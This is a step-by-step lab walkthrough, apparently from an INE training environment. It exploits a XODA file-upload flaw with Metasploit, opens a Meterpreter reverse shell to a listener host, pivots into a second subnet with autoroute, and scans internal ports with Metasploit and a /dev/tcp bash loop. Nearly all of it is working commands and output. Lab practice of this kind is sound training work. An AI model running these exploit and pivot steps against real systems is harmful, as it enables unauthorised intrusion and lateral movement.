RHOSTS 192.72.140.3 
LHOST 192.72.140.2

Step 1:
┌──(root㉿INE)-[~]
└─# nmap demo1.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-26 17:41 IST
Nmap scan report for demo1.ine.local (192.72.140.3)
Host is up (0.000027s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:C0:48:8C:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds

Step 2:
┌──(root㉿INE)-[~]
└─# curl 192.72.140.3                                                                                                                                     
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>XODA</title>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                        <script language="JavaScript" type="text/javascript">
                        //<![CDATA[
                        var countselected=0;
                        function stab(id){var _10=new Array();for(i=0;i<_10.length;i++){document.getElementById(_10[i]).className="tab";}document.getElementById(id).className="stab";}var allfiles=new Array('');
                        //]]>
                </script>
                <script language="JavaScript" type="text/javascript" src="/js/xoda.js"></script>
                <script language="JavaScript" type="text/javascript" src="/js/sorttable.js"></script>
                <link rel="stylesheet" href="/style.css" type="text/css" />
</head>

<body onload="document.lform.username.focus();">
        <div id="top">
                <a href="/" title="XODA"><span style="color: #56a;">XO</span><span style="color: #fa5;">D</span><span style="color: #56a;">A</span></a>
                        </div>
        <form method="post" action="/?log_in" name="lform" id="login">
                <p>Username:&nbsp;<input type="text" id="un" name="username" /></p>
                <p>Password:&nbsp;<input type="password" name="password" /></p>
                <p><input type="submit" name="submit" value="login" /></p>
        </form>
</body>
</html>

Step3:
service postgresql start
msfconsole
msf6 > use exploit/unix/webapp/xoda_file_upload
  [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/xoda_file_upload) > set RHOSTS 192.72.140.3
  RHOSTS => 192.72.140.3
msf6 exploit(unix/webapp/xoda_file_upload) > set LHOST 192.72.140.2
  LHOST => 192.72.140.2
msf6 exploit(unix/webapp/xoda_file_upload) > show options
  
  Module options (exploit/unix/webapp/xoda_file_upload):
  
     Name       Current Setting  Required  Description
     ----       ---------------  --------  -----------
     Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
     RHOSTS     192.72.140.3     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
     RPORT      80               yes       The target port (TCP)
     SSL        false            no        Negotiate SSL/TLS for outgoing connections
     TARGETURI  /xoda/           yes       The base path to the web application
     VHOST                       no        HTTP server virtual host
  
  
  Payload options (php/meterpreter/reverse_tcp):
  
     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST  192.72.140.2     yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port
  
  
  Exploit target:
  
     Id  Name
     --  ----
     0   XODA 0.4.5
  
  
  
  View the full module info with the info, or info -d command.
  
msf6 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
  TARGETURI => /
exploit

Step 4:
meterpreter > shell
  Process 822 created.
  Channel 0 created.
ip addr 
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
      link/ipip 0.0.0.0 brd 0.0.0.0
  190061: eth0@if190062: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
      link/ether 02:42:c0:48:8c:03 brd ff:ff:ff:ff:ff:ff
      inet 192.72.140.3/24 brd 192.72.140.255 scope global eth0
         valid_lft forever preferred_lft forever
  190063: eth1@if190064: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
      link/ether 02:42:c0:84:f7:02 brd ff:ff:ff:ff:ff:ff
      inet 192.132.247.2/24 brd 192.132.247.255 scope global eth1
         valid_lft forever preferred_lft forever
exit
  [-] core_channel_interact: Operation failed: 1
meterpreter > run autoroute -s 192.132.247.2

  [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
  [!] Example: run post/multi/manage/autoroute OPTION=value [...]
  [*] Adding a route to 192.132.247.2/255.255.255.0...
  [+] Added route to 192.132.247.2/255.255.255.0 via 192.72.140.3
  [*] Use the -p option to list all active routes
meterpreter > background
  [*] Backgrounding session 1...
msf6 exploit(unix/webapp/xoda_file_upload) > search portscan

Step 5:
msf6 exploit(unix/webapp/xoda_file_upload) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.132.247.3
  RHOSTS => 192.132.247.3
msf6 auxiliary(scanner/portscan/tcp) > set verbose false
  verbose => false
msf6 auxiliary(scanner/portscan/tcp) > set ports 1-1000
  ports => 1-1000
msf6 auxiliary(scanner/portscan/tcp) > exploit
  
  [+] 192.132.247.3:        - 192.132.247.3:21 - TCP OPEN
  [+] 192.132.247.3:        - 192.132.247.3:22 - TCP OPEN
  [+] 192.132.247.3:        - 192.132.247.3:80 - TCP OPEN
  [*] 192.132.247.3:        - Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) >

Step 6: 
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap

nano 
  #!/bin/bash
  for port in {1..1000}; do
   timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
  done
Save as bash-port-scanner.sh

Step 6:
sessions -i 1
